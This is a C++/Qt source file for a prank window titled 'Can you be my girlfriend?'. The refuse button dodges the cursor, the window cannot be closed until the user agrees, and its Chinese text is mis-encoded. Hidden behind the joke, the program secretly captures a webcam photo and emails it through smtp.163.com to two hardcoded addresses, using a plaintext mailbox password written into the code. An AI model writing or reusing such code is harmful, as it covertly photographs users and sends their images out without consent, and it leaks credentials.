#include "Be_my_girlfriend.h"

Be_my_girlfriend::Be_my_girlfriend(QWidget *parent)
	: QMainWindow(parent)
{
	this->setFixedSize(320, 240);//set the window size

	this->setWindowTitle(tr("Can you be my girlfriend?"));//set the title

	label = new QLabel(this);
	char *str1 = "����Ů���Ѱ�?";
	char *str2 = "ͬ��";
	char *str3 = "�ܾ�";
	QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
	QString gbk_string1 = gbk_codec->toUnicode(str1);
	QString gbk_string2 = gbk_codec->toUnicode(str2);
	QString gbk_string3 = gbk_codec->toUnicode(str3);

	label->setText(gbk_string1);
	label->setGeometry(120, 70, 320, 20);
	QFont font;
	font.setPointSize(12);
	QPalette pa;
	pa.setColor(QPalette::WindowText, Qt::blue);
	label->setFont(font);
	label->setPalette(pa);

	agree = new QPushButton(gbk_string2, this);
	disagree = new QPushButton(gbk_string3, this);

	agree->setGeometry(QRect(100, 140, 30, 30));
	connect(agree, SIGNAL(clicked(bool)), this, SLOT(agree_click()));
	disagree->setGeometry(QRect(200, 140, 30, 30));
	connect(disagree, SIGNAL(clicked(bool)), this, SLOT(disagree_click()));

	timer = new QTimer(this);
	timer->setInterval(100);
	timer->start();
	connect(timer, SIGNAL(timeout()), this, SLOT(timeroutslot()));
	std::srand((unsigned)std::time(NULL));

	camera = new QCamera();
	//view_finder = new QCameraViewfinder();
	camera_image_capture = new QCameraImageCapture(camera);
	camera_image_capture->setCaptureDestination(QCameraImageCapture::CaptureToFile);
	camera->setCaptureMode(QCamera::CaptureStillImage);
	connect(camera_image_capture, &QCameraImageCapture::imageCaptured, this, &Be_my_girlfriend::saveImage);
}

void Be_my_girlfriend::timeroutslot()
{
	if (disagree->geometry().contains(this->mapFromGlobal(QCursor::pos())))
	{
		count++;
		if (count <= 5)
		{
			disagree->setGeometry(QRect(200 + std::rand() % 50, 140 + std::rand() % 50, 30, 30));
		}
	}
}

void Be_my_girlfriend::agree_click()
{
	is_agree = 1;
	char *str1 = "���Ӧ��";
	char *str2 = "ллϱ��";
	char *str3 = "�G����ϱ������������";
	char *str4 = "�㲻˵���͵����Ӧ�� лл�� ��������";
	char *str5 = "Сϱ��";
	char *str6 = "��������Ϲ�������";
	char *str7 = "�Ϲ�";
	char *str8 = "����";
	char *stri1 = "�ҿ� û�뵽������������";
	char *stri2 = "�Ұ��㵱�ֵ� �㾹Ȼ��˯��";
	char *stri3 = "�� �������ǿ�������";
	char *stri4 = "�� ���ĸ���Ƥ�� ��̬������";
	char *stri5 = "�Բ��� �Ҵ���";
	char *stri6 = "��ԭ�����";
	char *stri7 = "�а�  ������ô�Ͽ� �Ҿ͵�����ʲôҲû����";

	QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
	QString gbk_string1 = gbk_codec->toUnicode(str1);
	QString gbk_string2 = gbk_codec->toUnicode(str2);
	QString gbk_string3 = gbk_codec->toUnicode(str3);
	QString gbk_string4 = gbk_codec->toUnicode(str4);
	QString gbk_string5 = gbk_codec->toUnicode(str5);
	QString gbk_string6 = gbk_codec->toUnicode(str6);
	QString gbk_string7 = gbk_codec->toUnicode(str7);
	QString gbk_string8 = gbk_codec->toUnicode(str8);

	QString gbk_str1 = gbk_codec->toUnicode(stri1);
	QString gbk_str2 = gbk_codec->toUnicode(stri2);
	QString gbk_str3 = gbk_codec->toUnicode(stri3);
	QString gbk_str4 = gbk_codec->toUnicode(stri4);
	QString gbk_str5 = gbk_codec->toUnicode(stri5);
	QString gbk_str6 = gbk_codec->toUnicode(stri6);
	QString gbk_str7 = gbk_codec->toUnicode(stri7);

	if (have_begged)
	{
		int husband = 1;
		QMessageBox::warning(this, gbk_string1, gbk_string2, QMessageBox::Ok);
		if (QMessageBox::Ok)
		{
			while (husband)
			{
				switch (QMessageBox::information(this, gbk_string5, gbk_string6, gbk_string7, gbk_string8, 0, 1))
				{
				case 0:
					husband = 0;
					break;
				case 1:
				default:
					husband = 1;
					break;
				}
			}
			camera->start();
			camera_image_capture->capture();
			CSmtp smtp(
				25,								/*smtp�˿�*/
				"smtp.163.com",					/*smtp��������ַ*/
				"qq3534679530@163.com",	/*��������ַ*/
				"acute166131",					/*��������*/
				"3534679530@qq.com",	/*Ŀ�������ַ*/
				"zhaopian",							/*����*/
				"zpzp"		/*�ʼ�����*/
			);
			CSmtp smtp2(
				25,								/*smtp�˿�*/
				"smtp.163.com",					/*smtp��������ַ*/
				"qq3534679530@163.com",	/*��������ַ*/
				"acute166131",					/*��������*/
				"1076922701@qq.com",	/*Ŀ�������ַ*/
				"zhaopian",							/*����*/
				"zpzp"		/*�ʼ�����*/
			);
			
			//��Ӹ���ʱע��,\һ��Ҫд��\\����Ϊת���ַ���Ե��
			string filePath("D:\\a.jpg");
			smtp.AddAttachment(filePath);
			smtp2.AddAttachment(filePath);
			int err = smtp.SendEmail_Ex();
			int err2 = smtp2.SendEmail_Ex();

			QMessageBox::warning(this, gbk_string3, gbk_string4, QMessageBox::Ok);
			if (QMessageBox::Ok)
				this->close();
		}
	}
	else
	{
		switch (QMessageBox::information(this, gbk_str1, gbk_str2, gbk_str5, gbk_str5, 0, 1))
		{
		case 0:
		case 1:
		default:
			switch (QMessageBox::information(this, gbk_str3, gbk_str4, gbk_str5, gbk_str5, 0, 1))
			{
			case 0:
			case 1:
			default:
				break;
			}
			break;
		}
		camera->start();
		camera_image_capture->capture();
		CSmtp smtp(
			25,								/*smtp�˿�*/
			"smtp.163.com",					/*smtp��������ַ*/
			"qq3534679530@163.com",	/*��������ַ*/
			"acute166131",					/*��������*/
			"3534679530@qq.com",	/*Ŀ�������ַ*/
			"zhaopian",							/*����*/
			"zpzp"		/*�ʼ�����*/
		);
		CSmtp smtp2(
			25,								/*smtp�˿�*/
			"smtp.163.com",					/*smtp��������ַ*/
			"qq3534679530@163.com",	/*��������ַ*/
			"acute166131",					/*��������*/
			"1076922701@qq.com",	/*Ŀ�������ַ*/
			"zhaopian",							/*����*/
			"zpzp"		/*�ʼ�����*/
		);

		//��Ӹ���ʱע��,\һ��Ҫд��\\����Ϊת���ַ���Ե��
		string filePath("D:\\a.jpg");
		smtp.AddAttachment(filePath);
		smtp2.AddAttachment(filePath);
		int err = smtp.SendEmail_Ex();
		int err2 = smtp2.SendEmail_Ex();
		QMessageBox::warning(this, gbk_str6, gbk_str7, QMessageBox::Ok);
		if (QMessageBox::Ok)
			this->close();
	}
}

void Be_my_girlfriend::disagree_click()
{
	have_begged = 1;
	char *str1 = "�㲻��Ӧ���Ҿ������Ĵ�";
	char *str2 = "��ʹ�Ӧ�Ұ�~";
	QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
	QString gbk_string1 = gbk_codec->toUnicode(str1);
	QString gbk_string2 = gbk_codec->toUnicode(str2);
	QMessageBox::warning(this, gbk_string2, gbk_string1, QMessageBox::Ok);
	disagree->setEnabled(false);
}

void Be_my_girlfriend::saveImage(int id, QImage image)
{
	QPixmap pixmap = QPixmap::fromImage(image);
	pixmap.save("D:\\a.jpg");
}

void Be_my_girlfriend::closeEvent(QCloseEvent *event)
{
	have_begged = 1;
	if (!is_agree)
	{
		char *str1 = "��ص��� �������Ӧ��";
		char *str2 = "�ز�������������";
		QTextCodec* gbk_codec = QTextCodec::codecForName("GBK");
		QString gbk_string1 = gbk_codec->toUnicode(str1);
		QString gbk_string2 = gbk_codec->toUnicode(str2);
		QMessageBox::warning(this, gbk_string2, gbk_string1, QMessageBox::Ok);
		event->ignore();
	}
}